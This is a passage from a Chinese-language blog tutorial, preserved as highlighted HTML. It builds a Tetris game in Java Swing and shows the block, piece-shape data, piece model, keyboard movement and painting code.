punctuation\">{\n    <!-- --></span>\n		g<span class=\"token punctuation\">.</span><span class=\"token function\">fillRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token operator\">+</span>x<span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token operator\">+</span>y<span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">return</span> x<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setX</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">return</span> y<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setY</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><mark>实例化这个类，并在paint方法中调用draw绘制方法</mark></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	x<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	y<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	curBlock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Block</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <pre><code class=\"prism language-java\"><span class=\"token annotation punctuation\">@Override</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">paint</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">paint</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curBlock<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		curBlock<span class=\"token punctuation\">.</span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>	\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/2021060723223877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 在Block类加入移动方法<br> 两个参数 <mark>boolean xDir, int step</mark><br> xDir 布尔值：true表示横向移动，false表示向下移动<br> step是步数：当xDir为true，我们设定为 1 和 -1 横向移动1表示向右，-1表示向左移动；当xDir为true为false，向下移动为1（因为不能向上移动）。</p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//移动</span>\n	<span class=\"token keyword\">void</span> <span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> xDir<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> step<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>xDir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//X方向的移动，step 正数向右 负数向左</span>\n			x <span class=\"token operator\">+=</span> step<span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//向下运动</span>\n			y <span class=\"token operator\">+=</span> step<span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n		panel<span class=\"token punctuation\">.</span><span class=\"token function\">repaint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><mark>GamePanel添加键盘事件</mark></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//添加键盘监听</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">createKeyListener</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">KeyAdapter</span> l <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">KeyAdapter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token comment\">//按下</span>\n		<span class=\"token annotation punctuation\">@Override</span>\n		<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">keyPressed</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">KeyEvent</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token keyword\">int</span> key <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span><span class=\"token function\">getKeyCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n				<span class=\"token comment\">//空格</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_SPACE<span class=\"token operator\">:</span>\n					<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n					\n				<span class=\"token comment\">//向上</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_UP<span class=\"token operator\">:</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_W<span class=\"token operator\">:</span>\n					<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n					\n				<span class=\"token comment\">//向右	</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_RIGHT<span class=\"token operator\">:</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_D<span class=\"token operator\">:</span>\n					<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curBlock<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> curBlock<span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n					<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n					\n				<span class=\"token comment\">//向下</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_DOWN<span class=\"token operator\">:</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_S<span class=\"token operator\">:</span>\n					<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curBlock<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> curBlock<span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n					<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n					\n				<span class=\"token comment\">//向左</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_LEFT<span class=\"token operator\">:</span>\n				<span class=\"token keyword\">case</span> <span class=\"token class-name\">KeyEvent</span><span class=\"token punctuation\">.</span>VK_A<span class=\"token operator\">:</span>\n					<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curBlock<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> curBlock<span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n					<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n		\n		<span class=\"token punctuation\">}</span>\n		<span class=\"token comment\">//松开</span>\n		<span class=\"token annotation punctuation\">@Override</span>\n		<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">keyReleased</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">KeyEvent</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token punctuation\">}</span>\n		\n	<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n	<span class=\"token comment\">//给主frame添加键盘监听</span>\n	mainFrame<span class=\"token punctuation\">.</span><span class=\"token function\">addKeyListener</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><mark>于是我操作一波</mark><br> <img src=\"https://img-blog.csdnimg.cn/20210607234047425.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_375\"></a>创建图形</h2> \n <p><mark>七种图形</mark><br> <img src=\"https://img-blog.csdnimg.cn/20210607234330921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 如上图，如果我们以标红的小方块为原点（0,0）那我们分析一下图形其他几个方块的位置。<br> <img src=\"https://img-blog.csdnimg.cn/20210607235240206.png\" alt=\"在这里插入图片描述\"><br> 比如上面图形，红色框住的为（0,0）的话，那最前面的那个是不是（-1,0），因为 y 他们是一样的，只要 x 往左边移动一个位置。<br> 以此类推，第3个应该是（1,0），第4个是（2,0）。<br> <img src=\"https://img-blog.csdnimg.cn/2021060723550855.png\" alt=\"在这里插入图片描述\"><br> 此图形呢，标红的为（0,0），它正下方的那个应该是（0,1），它右边那个是（1,0），它右下角的那个应该是（1,1）<br> <mark>于是我们可以设计一个Data类，专门存储7种图形的位置信息，分别对应前面图的7种模型</mark></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Data</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">List</span> datas <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n	<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data5 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data6 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> \n		datas<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>data7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h2><a id=\"_413\"></a>创建模型类</h2> \n <p><strong>其中创建的时候，随机从Data类里面7个数据里面取到一个，生成一个图形，根据对应二维数组作为下标来创建小方块。</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Model</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n\n	<span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> x<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> y<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">private</span> <span class=\"token class-name\">GamePanel</span> panel<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">private</span> <span class=\"token class-name\">List</span> blocks <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">boolean</span> moveFlag<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n	<span class=\"token keyword\">public</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> y<span class=\"token punctuation\">,</span><span class=\"token class-name\">GamePanel</span> panel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x<span class=\"token operator\">=</span>x<span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y<span class=\"token operator\">=</span>y<span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>panel<span class=\"token operator\">=</span>panel<span class=\"token punctuation\">;</span>\n		\n		<span class=\"token function\">createModel</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	\n	<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">createModel</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">int</span> type <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//1-7种模型</span>\n		<span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Data</span><span class=\"token punctuation\">.</span>datas<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token class-name\">Block</span> block<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">int</span> mX<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">int</span> mY<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			mX <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n			mY <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n			block <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Block</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> mX <span class=\"token punctuation\">,</span> mY<span class=\"token punctuation\">,</span> panel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			blocks<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>Block也要稍微做些变动</strong><br> <mark>需要加入偏移坐标值，来设定4个小方块的相对位置</mark><br> <img src=\"https://img-blog.csdnimg.cn/20210608000738536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> GamePanel类中实例化的就是Model类了，同时绘制的也是</p> \n <pre><code class=\"prism language-java\">curModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <pre><code class=\"prism language-java\"><span class=\"token annotation punctuation\">@Override</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">paint</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">paint</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token comment\">//当前模型</span>\n	<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curModel<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token class-name\">List</span> blocks <span class=\"token operator\">=</span> curModel<span class=\"token punctuation\">.</span><span class=\"token function\">getBlocks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">Block</span> block<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">for</span> <span class=\"token 